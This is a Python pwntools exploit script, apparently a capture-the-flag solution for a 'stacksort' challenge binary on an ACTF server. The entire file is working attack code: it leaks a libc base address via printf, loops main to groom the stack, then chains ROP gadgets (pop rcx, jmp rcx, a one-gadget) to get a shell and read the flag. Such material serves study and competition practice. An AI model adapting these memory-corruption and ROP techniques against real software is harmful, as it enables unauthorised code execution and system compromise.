#!/usr/bin/env python3

from pwn import *

exe = ELF("./stacksort")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

serv = "challs.actf.co"
port = 31500
#serv = "localhost"
#port = 5000

context.binary = exe

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
                b *0x00401319
                b *$libc+0xe5644
            """)
    return r

r = conn()

N = 0x100

def send(items):
    for i in range(N):
        r.sendlineafter(b":", str(items[i]).encode())

def sendsleep(items):
    for i in range(N):
        r.sendline(str(items[i]).encode())
        sleep(0.1)
    #r.recvuntil(b"255:")

def main():
    # leak libc and loop main,
    # there is a convenient _start that
    # will do this for us after the printfs
    lowret = 0x40101a
    # printf sled will movaps segfault,
    # so we read sled instead, cuz no ret
    # between _start and exe printf
    highret = exe.sym.read
    align = 1
    items = [lowret]*(82+align) + [exe.sym.printf] + [highret]*(N-83-align)
    send(items)
    r.recv(1)
    libc.address = u64(r.recv(6).ljust(8, b"\x00"))-0x21b150
    log.info(f"{hex(libc.address)=}")
    onegadget = libc.address+0xebc85
    # now we have to carefully manipulate
    # the stack to have a large sled so we can do libc rop,
    # we can loop main with careful inputs to achieve this
    highret = 0x401251
    lowret = 0x40124b
    items = [highret]*(153+align) + [lowret]*(N-152-align) + [exe.sym.main]
    sendsleep(items)
    sendsleep(items)
    lowret = libc.address+0x3774e
    poprcx = libc.address+0x3d1ee
    onegadget = libc.address+0xebc88
    # pop rbp; jmp rcx;
    jmprcx = libc.address+0x15f435
    rw = libc.address+0x21a000+0x78
    # now our stack is effectively flushed with
    # addresses greater than libc, no onegadgets
    # work out of the box, but we can do setup.
    # very finnicky on remote btw
    sendsleep([poprcx, onegadget, jmprcx, rw] + [lowret]*(N-4))
    r.sendline(b"cat flag.txt")
    r.interactive()

if __name__ == "__main__":
    main()
